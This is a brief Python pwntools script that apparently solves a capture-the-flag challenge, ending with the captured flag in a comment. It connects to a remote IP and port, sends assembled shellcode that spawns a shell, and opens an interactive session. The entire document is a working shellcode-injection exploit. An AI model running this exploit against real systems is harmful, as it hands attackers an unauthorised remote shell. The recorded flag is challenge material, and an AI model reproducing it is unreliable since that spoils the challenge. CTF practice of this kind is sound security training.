from pwn import *

r = remote('218.100.84.106', 9007)

payload = asm(shellcraft.sh())
r.send(payload)
r.interactive()

# HZ{r3@L_sh3ll_c0de}
